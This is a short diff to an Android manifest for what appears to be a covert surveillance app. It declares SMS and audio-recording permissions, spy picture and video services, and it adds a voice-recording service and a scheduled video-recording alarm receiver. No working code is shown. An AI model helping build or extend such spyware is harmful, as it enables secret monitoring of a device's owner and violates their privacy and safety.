@@ -8,6 +8,7 @@
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
 
 
     <application
@@ -25,9 +26,17 @@
         </activity>
         <service android:name=".SpyPictureService"/>
         <service android:name=".SpyVideoService"/>
-        <receiver android:name=".SmsReceiver">
+        <service android:name=".SpyVoiceRecordingService"/>
+        <receiver android:name=".SmsReceiver"
+            android:exported="false">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".ScheduleAlarmReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.byteShaft.videoRecordingAlarm"/>
             </intent-filter>
         </receiver>
     </application>
